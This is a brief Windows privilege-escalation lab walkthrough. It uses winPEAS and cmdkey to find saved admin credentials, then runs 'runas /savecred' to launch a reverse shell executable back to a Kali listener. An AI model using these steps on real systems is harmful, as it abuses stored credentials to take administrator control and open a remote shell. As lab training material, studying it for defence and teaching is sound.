1.Use winPEAS to check for saved credentials:
> .\winPEASany.exe quiet cmd windowscreds


2.It appears that saved credentials for the admin user exist.


3.We can verify this manually using the following command:
> cmdkey /list

4.If the saved credentials arenâ€™t present, run the following script to refresh the credential:
> C:\PrivEsc\savecred.bat


5.We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:


> runas /savecred /user:admin
C:\PrivEsc\reverse.exe
